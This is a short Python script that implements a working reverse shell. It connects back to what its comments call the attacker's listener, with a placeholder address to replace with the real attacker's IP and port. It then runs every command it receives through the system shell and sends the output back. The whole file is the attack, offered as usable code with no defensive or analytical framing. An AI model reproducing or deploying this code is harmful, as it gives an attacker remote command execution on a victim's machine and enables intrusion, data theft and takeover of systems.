import socket
import subprocess

# Subprocess lets you run commands
# Create a TCP socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect back to the attacker's listener
client_socket.connect(("127.0.0.1", 1337))  # Replace with actual attacker's IP and port

# Enter a persistent command listener loop
while True:
    try:
        command = client_socket.recv(4096).decode()

        if not command.strip():
            continue  # Ignore empty commands

        if command.lower() == "exit":
            break  # Clean exit on "exit" command

        try:
            # Run the command via system shell
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output  # Capture stderr if command fails
        except Exception as e:
            output = str(e).encode()  # Catch any other errors and convert to bytes

        # Send the output back to the server
        client_socket.send(output)

    except Exception as e:
        print(f"[!] Exception: {e}")
        break

client_socket.close()
